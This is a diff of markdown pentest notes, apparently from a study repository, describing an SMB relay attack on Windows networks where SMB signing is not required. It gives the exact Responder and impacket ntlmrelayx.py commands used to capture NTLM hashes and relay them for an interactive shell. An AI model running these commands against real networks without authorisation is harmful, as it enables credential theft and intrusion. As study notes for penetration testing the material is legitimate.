@@ -42,19 +42,15 @@ C:\windows\SYSVOL  → groups policy
 ![alt text](img/remote.png "remote resolution")
 
 ## smbrelay attack
-### attack vector
+### idea
   smb signing enable but not require
   
-  pssed `NTLMv2` must be at least local admin
+  whch allow us to grab the hash
 ### tools
-respnder
-
-ntlmrelayx.py from impacket lib
-### reproduce
 responder -I eth0 -rwdv `disable smb and http from /etc/respnder/Responder.conf`
 
 python /usr/share/doc/python-impacket/examples/ntlmrelayx.py -tf target.txt -smb2support  -i
-
+### reproduce
 [logo]: img/responder.png
 ![alt text](img/responder.png "hashes dumped")
 ### payoff
